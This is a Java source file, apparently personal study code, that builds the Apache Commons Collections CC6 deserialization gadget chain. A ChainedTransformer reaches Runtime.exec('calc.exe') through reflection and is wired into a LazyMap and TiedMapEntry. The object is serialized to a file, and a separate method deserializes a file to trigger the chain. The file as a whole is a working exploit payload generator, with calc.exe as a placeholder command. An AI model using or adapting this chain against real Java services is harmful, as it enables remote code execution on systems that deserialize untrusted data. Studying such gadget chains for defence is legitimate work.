package demo.cc.cc6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class ApacheCC6 {
    public void test1() throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
        };
        ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
        //上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。

        Map<Object,Object> hashMap = new HashMap<>();
        hashMap.put("key","value");
        Map<Object,Object> lazyMap = LazyMap.decorate(hashMap,new ConstantTransformer(null));

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "hello");
        Map<Object,Object> newMap = new HashMap<>();
        newMap.put(tiedMapEntry,"1234566");

        Class clazz = lazyMap.getClass();
        Field factory = clazz.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,chainedTransformer);

        lazyMap.remove("hello");

        FileOutputStream fos = new FileOutputStream("./data/apachecc6.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(newMap);

    }
    public void unserialize() throws Exception{
        FileInputStream fis = new FileInputStream("./data/cc6.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        ois.readObject();
    }

    public static void main(String[] args) throws Exception {
        ApacheCC6 apacheCC6 = new ApacheCC6();
//        apacheCC6.test1();
        apacheCC6.unserialize();
    }
}
